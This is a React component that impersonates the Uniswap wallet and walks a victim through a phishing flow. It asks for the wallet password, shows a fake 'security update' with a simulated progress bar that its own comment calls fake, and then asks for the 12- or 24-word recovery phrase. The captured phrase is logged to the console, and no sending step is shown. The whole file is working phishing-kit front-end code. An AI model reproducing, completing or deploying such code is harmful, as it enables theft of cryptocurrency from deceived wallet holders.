import { useState, useEffect } from 'react';

// Import your local Uniswap logo asset
import uniswapLogo from '../assets/uniswap.png';

interface UniswapPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 'splash' | 'password' | 'update_prompt' | 'updating' | 'import';

export default function UniswapPanel({ isOpen, onClose }: UniswapPanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [phraseLength, setPhraseLength] = useState<12 | 24>(12);
  const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
  const [updateProgress, setUpdateProgress] = useState(0);
  const [invalidCount, setInvalidCount] = useState(0);

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setPassword('');
      setShowPassword(false);
      setPhraseLength(12);
      setPhraseValues(Array(24).fill(''));
      setUpdateProgress(0);
      setInvalidCount(0);

      const timer = setTimeout(() => {
        setView('password');
      }, 2500);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Handle fake update progress
  useEffect(() => {
    if (view === 'updating') {
      let progress = 0;
      const interval = setInterval(() => {
        progress += Math.floor(Math.random() * 15) + 5;
        if (progress >= 100) {
          progress = 100;
          clearInterval(interval);
          setTimeout(() => setView('import'), 600);
        }
        setUpdateProgress(progress);
      }, 300);
      return () => clearInterval(interval);
    }
  }, [view]);

  const handleWordChange = (index: number, value: string) => {
    const newValues = [...phraseValues];
    newValues[index] = value;
    setPhraseValues(newValues);
    
    let count = 0;
    newValues.slice(0, phraseLength).forEach(val => {
      if (val.length > 0 && !/^[a-z]+$/.test(val)) {
        count++;
      }
    });
    setInvalidCount(count);
  };

  const isPhraseComplete = () => {
    const activeWords = phraseValues.slice(0, phraseLength);
    return activeWords.every(word => word.trim().length > 0) && invalidCount === 0;
  };

  return (
    <>
      <div className="fixed inset-0 z-[2147483648] pointer-events-none font-sans">
        
        {/* Backdrop */}
        <div 
          className={`absolute inset-0 bg-[#12121280] transition-opacity duration-[400ms] ease-in-out pointer-events-auto ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`} 
          onClick={onClose}
        ></div>
        
        {/* Main Modal */}
        <div className={`flex pointer-events-auto transition-all duration-[600ms] ease-[cubic-bezier(0.22,1,0.36,1)] fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full max-h-full md:top-0 md:right-8 md:left-auto md:translate-x-0 md:translate-y-0 md:w-[360px] md:h-[680px] md:border border-[#eaecef] md:overflow-y-hidden overflow-y-auto ${isOpen ? 'scale-100 opacity-100' : 'scale-95 opacity-0'}`}>
          <div className="h-full w-full bg-[#ffffff] shadow-2xl relative overflow-hidden flex flex-col">

            {/* ========================================== */}
            {/* LAYER 1: SPLASH SCREEN                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-10 flex flex-col items-center justify-center transition-all duration-700 ease-[cubic-bezier(0.25,1,0.5,1)] bg-white ${view === 'splash' ? 'opacity-100 scale-100 pointer-events-auto' : 'opacity-0 scale-110 blur-sm pointer-events-none'}`}>
              <div className="animate-[uniswapPulse_2s_ease-in-out_infinite]">
                <img src={uniswapLogo} alt="Uniswap" className="w-32 h-32 drop-shadow-[0_0_15px_rgba(255,55,199,0.3)] object-contain" />
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 2: PASSWORD SCREEN                   */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-20 flex flex-col px-4 transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] bg-white ${view === 'password' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              <div className="flex-1 flex flex-col items-center justify-center">
                
                <div className="flex items-center justify-center mt-20 mb-8">
                  <img src={uniswapLogo} alt="Uniswap" className="w-[72px] h-[72px] object-contain" />
                </div>
                
                <div className="flex flex-col items-center justify-center mb-8 text-center">
                  <h4 className="font-inter text-[#222222] font-semibold text-[20px] mb-1">Welcome back</h4>
                  <p className="font-inter text-[#7d7d7d] font-normal text-[16px]">Enter your password to unlock</p>
                </div>
                
                <div className="relative w-full mb-32">
                  <input 
                    className="w-full h-[54px] py-[11px] pl-[24px] pr-[48px] text-[16px] font-medium rounded-[16px] text-[#222222] border border-[#2222220d] bg-[#f9f9f9] focus:bg-[#ffffff] focus:border-[#222222] outline-none transition-all duration-300 font-inter" 
                    type={showPassword ? "text" : "password"} 
                    placeholder="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  <button 
                    type="button" 
                    onClick={() => setShowPassword(!showPassword)}
                    className="group cursor-pointer absolute right-4 top-[17px]"
                  >
                    {!showPassword ? (
                      <svg className="text-[#909090] w-[20px] h-[20px]" viewBox="0 0 16 16" fill="none" strokeWidth="8"><path d="M9.83336 8.00016C9.83336 9.0115 9.01136 9.8335 8.00003 9.8335C6.98869 9.8335 6.16669 9.0115 6.16669 8.00016C6.16669 7.7675 6.21464 7.5468 6.29397 7.34147C6.42331 7.44414 6.57935 7.51481 6.75735 7.51481C7.17535 7.51481 7.51468 7.17549 7.51468 6.75749C7.51468 6.57949 7.444 6.42344 7.34134 6.29411C7.54667 6.21477 7.76736 6.16683 8.00003 6.16683C9.01136 6.16683 9.83336 6.98883 9.83336 8.00016ZM13.7281 8.98486C12.9101 10.3542 11.0727 12.6668 8.00003 12.6668C4.92736 12.6668 3.09 10.3542 2.272 8.98486C1.90933 8.3782 1.90933 7.62213 2.272 7.01546C3.09 5.64613 4.92736 3.3335 8.00003 3.3335C11.0727 3.3335 12.9101 5.64613 13.7281 7.01546C14.0907 7.62213 14.0907 8.3782 13.7281 8.98486ZM10.8334 8.00016C10.8334 6.43816 9.56269 5.16683 8.00003 5.16683C6.43736 5.16683 5.16669 6.43816 5.16669 8.00016C5.16669 9.56216 6.43736 10.8335 8.00003 10.8335C9.56269 10.8335 10.8334 9.56216 10.8334 8.00016Z" fill="currentColor"></path></svg>
                    ) : (
                      <svg className="text-[#909090] w-[20px] h-[20px]" viewBox="0 0 24 24" fill="none" strokeWidth="8"><path d="M20.5901 10.52C21.1401 11.43 21.1401 12.57 20.5901 13.48C19.3601 15.53 16.61 19 12 19C11.252 19 10.5481 18.905 9.89407 18.74C9.67107 18.684 9.60094 18.3981 9.76394 18.2361L11.6599 16.3401C11.7759 16.2241 11.92 16.25 12 16.25C14.344 16.25 16.25 14.343 16.25 12C16.25 11.92 16.2381 11.762 16.3211 11.679L19.063 8.93704C19.19 8.81004 19.4039 8.82313 19.5149 8.96413C19.9549 9.52013 20.3131 10.053 20.5901 10.52ZM21.5301 3.53005L3.53005 21.5301C3.38405 21.6761 3.19202 21.75 3.00002 21.75C2.80802 21.75 2.61599 21.6771 2.46999 21.5301C2.17699 21.2371 2.17699 20.762 2.46999 20.469L6.17507 16.7639C4.90507 15.6829 3.98394 14.436 3.40994 13.479C2.85994 12.569 2.85994 11.4291 3.40994 10.5191C4.63994 8.46907 7.39002 4.99905 12 4.99905C13.824 4.99905 15.3471 5.54595 16.6131 6.32595L20.47 2.46902C20.763 2.17602 21.238 2.17602 21.531 2.46902C21.824 2.76202 21.8231 3.23705 21.5301 3.53005ZM8.52004 14.419L9.60891 13.3301C9.38691 12.9351 9.25002 12.486 9.25002 12C9.25002 11.65 9.31996 11.32 9.43996 11.01C9.62996 11.17 9.86992 11.27 10.1399 11.27C10.7599 11.27 11.27 10.7599 11.27 10.1399C11.27 9.86992 11.17 9.62996 11.01 9.43996C11.32 9.31996 11.65 9.25002 12 9.25002C12.486 9.25002 12.9361 9.38691 13.3301 9.60891L14.419 8.52004C13.731 8.03804 12.899 7.75002 12 7.75002C9.66002 7.75002 7.75002 9.66002 7.75002 12C7.75002 12.9 8.03804 13.731 8.52004 14.419Z" fill="currentColor"></path></svg>
                    )}
                  </button>
                </div>
                
                <div className="w-full mb-0">
                  <button 
                    onClick={() => setView('update_prompt')}
                    disabled={password.length < 3}
                    className="w-full h-[54px] text-[#ffffff] bg-[#ff37c7] font-medium font-inter text-[18px] cursor-pointer rounded-[20px] px-4 py-[10px] hover:opacity-80 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98]" 
                    type="button"
                  >
                    Unlock
                  </button>
                </div>
                <div className="w-full mt-4">
                  <button className="w-full h-[54px] text-[#7d7d7d] bg-transparent font-medium font-inter text-[16px] cursor-pointer rounded-[20px] px-4 py-[10px] hover:text-[#222222] transition-colors duration-300" type="button">
                    Forgot password?
                  </button>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 3: UPDATE PROMPT                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-30 bg-white transition-all duration-500 ease-[cubic-bezier(0.16,1,0.3,1)] flex flex-col ${view === 'update_prompt' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              <div className="flex justify-start items-center px-3 pt-3 shrink-0">
                <button className="p-2 rounded-full hover:bg-[#f9f9f9] transition-all duration-300 cursor-pointer active:scale-95" type="button" onClick={onClose}>
                  <svg className="w-6 h-6 text-[#7d7d7d]" viewBox="0 0 24 24" fill="none" strokeWidth="8"><path d="M20 12C20 12.5523 19.5523 13 19 13L7.41421 13L12.7071 18.2929C13.0976 18.6834 13.0976 19.3166 12.7071 19.7071C12.3166 20.0976 11.6834 20.0976 11.2929 19.7071L4.29289 12.7071C3.90237 12.3166 3.90237 11.6834 4.29289 11.2929L11.2929 4.29289C11.6834 3.90237 12.3166 3.90237 12.7071 4.29289C13.0976 4.68342 13.0976 5.31658 12.7071 5.70711L7.41421 11H19C19.5523 11 20 11.4477 20 12Z" fill="currentColor" fillRule="evenodd" clipRule="evenodd"></path></svg>
                </button>
              </div>
              
              <div className="flex flex-col items-center justify-center flex-grow px-5 pb-6">
                <div className="mb-6">
                  <div className="h-16 w-16 flex items-center justify-center rounded-[16px] bg-[#fc72ff33]">
                    <img src={uniswapLogo} alt="Uniswap" className="w-10 h-10 object-contain" />
                  </div>
                </div>
                
                <div className="flex flex-col items-center justify-center mb-6 text-center">
                  <h4 className="font-inter text-[#222222] font-semibold text-[22px] mb-1">Update Available</h4>
                  <p className="font-inter text-[#7d7d7d] font-normal text-[15px]">Version 1.62.1.1</p>
                </div>
                
                <div className="w-full mb-6 p-4 bg-[#fff2fc] border border-[#fc72ff33] rounded-[16px]">
                  <div className="flex items-start">
                    <div className="flex-shrink-0 mr-3 mt-0.5">
                      <svg className="w-5 h-5 text-[#ff37c7]" viewBox="0 0 24 24" fill="none"><path d="M10.9906 2.29105C11.5576 1.7239 12.4406 1.7239 13.0068 2.29105L21.7086 10.9928C22.2757 11.5591 22.2757 12.4428 21.7086 13.0098L13.0068 21.7117C12.4406 22.2788 11.5576 22.2788 10.9906 21.7117L2.29141 13.0098C1.7252 12.4428 1.7252 11.5591 2.29141 10.9928L10.9906 2.29105Z" fill="currentColor" fillRule="evenodd" clipRule="evenodd"></path><path d="M12 8.25C12.4142 8.25 12.75 8.58579 12.75 9V13.5C12.75 13.9142 12.4142 14.25 12 14.25C11.5858 14.25 11.25 13.9142 11.25 13.5V9C11.25 8.58579 11.5858 8.25 12 8.25Z" fill="white" fillRule="evenodd" clipRule="evenodd"></path><path d="M12 15.75C12.4142 15.75 12.75 16.0858 12.75 16.5C12.75 16.9142 12.4142 17.25 12 17.25C11.5858 17.25 11.25 16.9142 11.25 16.5C11.25 16.0858 11.5858 15.75 12 15.75Z" fill="white" fillRule="evenodd" clipRule="evenodd"></path></svg>
                    </div>
                    <div>
                      <p className="font-inter text-[#222222] font-semibold text-[14px] mb-1">Important security update</p>
                      <p className="font-inter text-[#7d7d7d] font-normal text-[14px]">This update includes critical security improvements to keep your wallet protected.</p>
                    </div>
                  </div>
                </div>
                
                <div className="w-full mb-6">
                  <p className="font-inter text-[#222222] font-semibold text-[15px] mb-4">What's new</p>
                  <ul className="space-y-4">
                    <li className="flex items-start">
                      <div className="flex-shrink-0 mr-3 mt-1.5">
                        <div className="w-2 h-2 rounded-full bg-[#ff37c7]"></div>
                      </div>
                      <span className="font-inter text-[#444444] font-normal text-[14px] leading-[20px]">Enhanced trading experience with improved token swaps and lower slippage</span>
                    </li>
                    <li className="flex items-start">
                      <div className="flex-shrink-0 mr-3 mt-1.5">
                        <div className="w-2 h-2 rounded-full bg-[#ff37c7]"></div>
                      </div>
                      <span className="font-inter text-[#444444] font-normal text-[14px] leading-[20px]">Fixed security vulnerability in transaction signing process</span>
                    </li>
                    <li className="flex items-start">
                      <div className="flex-shrink-0 mr-3 mt-1.5">
                        <div className="w-2 h-2 rounded-full bg-[#ff37c7]"></div>
                      </div>
                      <span className="font-inter text-[#444444] font-normal text-[14px] leading-[20px]">Improved connection stability with Web3 dApps</span>
                    </li>
                  </ul>
                </div>
                
                <div className="w-full mt-auto">
                  <button 
                    onClick={() => setView('updating')}
                    className="w-full text-[#ffffff] bg-[#ff37c7] font-medium font-inter text-[16px] cursor-pointer rounded-[16px] px-4 py-[14px] hover:opacity-80 transition-all duration-300 active:scale-[0.98]" 
                    type="button"
                  >
                    Update now
                  </button>
                  
                  <div className="text-center mt-5">
                    <a href="https://support.uniswap.org/hc/en-us" target="_blank" rel="noreferrer" className="font-inter text-[#7d7d7d] text-[14px] font-normal hover:text-[#222222] transition-colors hover:underline">Need help? Contact support</a>
                  </div>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 4: UPDATING STATE (PROGRESS BAR)     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-40 bg-white transition-opacity duration-500 ${view === 'updating' ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}>
              <div className="h-full flex flex-col items-center justify-center px-6">
                
                <div className="mb-10 relative">
                  <div className="h-24 w-24 flex items-center justify-center rounded-[20px] bg-[#fc72ff33] animate-[uniswapPulse_2s_infinite_ease-in-out]">
                    <img src={uniswapLogo} alt="Uniswap" className="w-14 h-14 object-contain" />
                  </div>
                </div>
                
                <div className="flex flex-col items-center justify-center mb-10 text-center">
                  <h4 className="font-inter text-[#222222] font-semibold text-[22px] mb-2">Updating Uniswap Wallet</h4>
                  <p className="font-inter text-[#7d7d7d] font-normal text-[15px]">Please wait while we update to version 1.62.1.1</p>
                </div>
                
                <div className="w-full max-w-md mb-8">
                  <div className="w-full h-2 bg-[#f2f2f2] rounded-full overflow-hidden">
                    <div className="h-full bg-[#ff37c7] rounded-full transition-all duration-300" style={{ width: `${updateProgress}%` }}></div>
                  </div>
                  
                  <div className="flex items-center justify-between mt-3">
                    <p className="font-inter text-[#7d7d7d] text-[14px] font-normal">Downloading update...</p>
                    <p className="font-inter text-[#222222] text-[14px] font-bold">{updateProgress}%</p>
                  </div>
                </div>
                
                <p className="font-inter text-[#999999] text-[14px] font-normal text-center mt-12">Please do not close this window during the update.</p>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 5: IMPORT WALLET (SEED PHRASE)       */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-50 bg-white transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] flex flex-col ${view === 'import' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex justify-start items-center px-3 pt-3 shrink-0">
                <button className="p-2 rounded-full hover:bg-[#f9f9f9] transition-all duration-300 cursor-pointer active:scale-95" type="button" onClick={onClose}>
                  <svg className="w-6 h-6 text-[#7d7d7d]" viewBox="0 0 24 24" fill="none" strokeWidth="8"><path d="M20 12C20 12.5523 19.5523 13 19 13L7.41421 13L12.7071 18.2929C13.0976 18.6834 13.0976 19.3166 12.7071 19.7071C12.3166 20.0976 11.6834 20.0976 11.2929 19.7071L4.29289 12.7071C3.90237 12.3166 3.90237 11.6834 4.29289 11.2929L11.2929 4.29289C11.6834 3.90237 12.3166 3.90237 12.7071 4.29289C13.0976 4.68342 13.0976 5.31658 12.7071 5.70711L7.41421 11H19C19.5523 11 20 11.4477 20 12Z" fill="currentColor" fillRule="evenodd" clipRule="evenodd"></path></svg>
                </button>
              </div>

              <div className="flex flex-col items-center justify-center gap-y-2 mt-2 mb-4 shrink-0">
                <div className="h-12 w-12 flex items-center justify-center bg-[#f9f9f9] rounded-[14px]">
                  <svg className="w-6 h-6 text-[#222222]" viewBox="0 0 24 24" fill="none" strokeWidth="8"><path d="M12.75 6V3.75L17.25 8.25H15C13.42 8.25 12.75 7.58 12.75 6ZM14.75 16.6V17C14.26 17.5 14 18.2 14 19.05V20.7C14 20.87 13.87 21 13.7 21H6C4 21 3 20 3 18V6C3 4 4 3 6 3H11.25V6C11.25 8.42 12.58 9.75 15 9.75H18V12.64C18 12.79 17.9 12.9 17.75 12.93C16.04 13.27 14.75 14.79 14.75 16.6ZM7.75 16C7.75 15.586 7.414 15.25 7 15.25C6.586 15.25 6.25 15.586 6.25 16C6.25 16.414 6.586 16.75 7 16.75C7.414 16.75 7.75 16.414 7.75 16ZM7.75 12C7.75 11.586 7.414 11.25 7 11.25C6.586 11.25 6.25 11.586 6.25 12C6.25 12.414 6.586 12.75 7 12.75C7.414 12.75 7.75 12.414 7.75 12ZM11.75 16C11.75 15.586 11.414 15.25 11 15.25H9.5C9.086 15.25 8.75 15.586 8.75 16C8.75 16.414 9.086 16.75 9.5 16.75H11C11.414 16.75 11.75 16.414 11.75 16ZM14.75 12C14.75 11.586 14.414 11.25 14 11.25H9.5C9.086 11.25 8.75 11.586 8.75 12C8.75 12.414 9.086 12.75 9.5 12.75H14C14.414 12.75 14.75 12.414 14.75 12ZM21.5 19.05V21.15C21.5 22.05 21.0499 22.5 20.1499 22.5H16.8501C15.9501 22.5 15.5 22.05 15.5 21.15V19.05C15.5 18.38 15.751 17.961 16.25 17.79V16.6C16.25 15.359 17.26 14.35 18.5 14.35C19.74 14.35 20.75 15.359 20.75 16.6V17.79C21.249 17.961 21.5 18.38 21.5 19.05ZM19.25 16.6C19.25 16.186 18.913 15.85 18.5 15.85C18.087 15.85 17.75 16.186 17.75 16.6V17.7H19.25V16.6Z" fill="currentColor"></path></svg>
                </div>
                <div className="grid items-center justify-center text-center">
                  <h4 className="font-inter text-[#222222] font-semibold text-[20px] mb-1.5">Import with your recovery phrase</h4>
                  <p className="font-inter text-[#7d7d7d] font-normal text-[15px]">Type or paste your {phraseLength}-word recovery phrase</p>
                </div>
              </div>

              {/* Dynamic Error */}
              <div className={`px-4 mb-3 transition-opacity duration-300 text-center min-h-[20px] ${invalidCount > 0 ? 'opacity-100' : 'opacity-0'}`}>
                <span className="font-inter text-[#ff5f52] font-medium text-[14px]">
                  {invalidCount} word{invalidCount > 1 ? 's are' : ' is'} invalid or misspelled
                </span>
              </div>

              {/* Grid */}
              <div className="px-5 max-h-[350px] overflow-y-auto uniswap-custom-scrollbar pb-2">
                <div className="grid grid-cols-3 gap-3">
                  {Array.from({ length: phraseLength }).map((_, i) => {
                    const isError = phraseValues[i].length > 0 && !/^[a-z]+$/.test(phraseValues[i]);
                    return (
                      <div key={i} className="relative group">
                        <div className="absolute left-[16px] top-[13px] pointer-events-none">
                          <p className="font-inter text-[#7d7d7d] group-focus-within:text-[#222222] transition-colors text-[14px] font-normal">{i + 1}</p>
                        </div>
                        <input 
                          className={`w-full h-[46px] py-[11px] pl-[40px] pr-[8px] text-[15px] font-medium rounded-[16px] text-[#222222] border outline-none transition-all duration-300 font-inter ${isError ? 'bg-[#fa2b391f] border-transparent text-[#ff5f52] focus:bg-[#fa2b391f]' : 'bg-[#f9f9f9] border-[#2222220d] focus:bg-[#ffffff] focus:border-[#222222] hover:border-[#22222240]'}`} 
                          type="text" 
                          value={phraseValues[i]}
                          onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
                        />
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Footer */}
              <div className="mt-auto px-5 pt-4 pb-6 bg-white">
                <div className="flex items-center justify-center mb-5">
                  <button 
                    className="flex items-center justify-center gap-x-1 w-full active:opacity-70 transition-all duration-300 group" 
                    type="button" 
                    onClick={() => {
                      setPhraseLength(phraseLength === 12 ? 24 : 12);
                      setPhraseValues(Array(24).fill(''));
                      setInvalidCount(0);
                    }}
                  >
                    <span className="text-[#7d7d7d] hover:text-[#222222] transition-colors font-medium font-inter text-[14px]">
                      {phraseLength === 12 ? "My recovery phrase is longer" : "My recovery phrase is 12 words"}
                    </span>
                    <span className={`transition-transform duration-300 ${phraseLength === 12 ? 'rotate-[270deg]' : 'rotate-[90deg]'}`}>
                      <svg className="w-[20px] h-auto text-[#bfbfbf] group-hover:text-[#7d7d7d] transition-colors" viewBox="0 0 24 24" fill="none" strokeWidth="8"><path d="M15.7071 5.29289C16.0976 5.68342 16.0976 6.31658 15.7071 6.70711L10.4142 12L15.7071 17.2929C16.0976 17.6834 16.0976 18.3166 15.7071 18.7071C15.3166 19.0976 14.6834 19.0976 14.2929 18.7071L8.2929 12.7071C7.9024 12.3166 7.9024 11.6834 8.2929 11.2929L14.2929 5.29289C14.6834 4.90237 15.3166 4.90237 15.7071 5.29289Z" fill="currentColor" fillRule="evenodd" clipRule="evenodd"></path></svg>
                    </span>
                  </button>
                </div>
                <div className="w-full">
                  <button 
                    className="w-full text-[#ffffff] bg-[#ff37c7] font-semibold font-inter text-[17px] cursor-pointer rounded-[16px] px-4 py-[14px] hover:opacity-80 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98]" 
                    type="button" 
                    disabled={!isPhraseComplete()}
                    onClick={() => {
                      console.log("Uniswap Import Complete:", phraseValues.slice(0, phraseLength));
                      onClose();
                    }}
                  >
                    Continue
                  </button>
                </div>
              </div>
            </div>

          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .uniswap-custom-scrollbar::-webkit-scrollbar {
          width: 5px;
        }
        .uniswap-custom-scrollbar::-webkit-scrollbar-track {
          background: #f9f9f9;
          border-radius: 4px;
        }
        .uniswap-custom-scrollbar::-webkit-scrollbar-thumb {
          background: #d1d1d1;
          border-radius: 4px;
        }
        .uniswap-custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: #a1a1a1;
        }
        
        @keyframes uniswapPulse {
          0% { box-shadow: 0 0 0 0 rgba(252, 114, 255, 0.4); }
          70% { box-shadow: 0 0 0 15px rgba(252, 114, 255, 0); }
          100% { box-shadow: 0 0 0 0 rgba(252, 114, 255, 0); }
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}} />
    </>
  );
}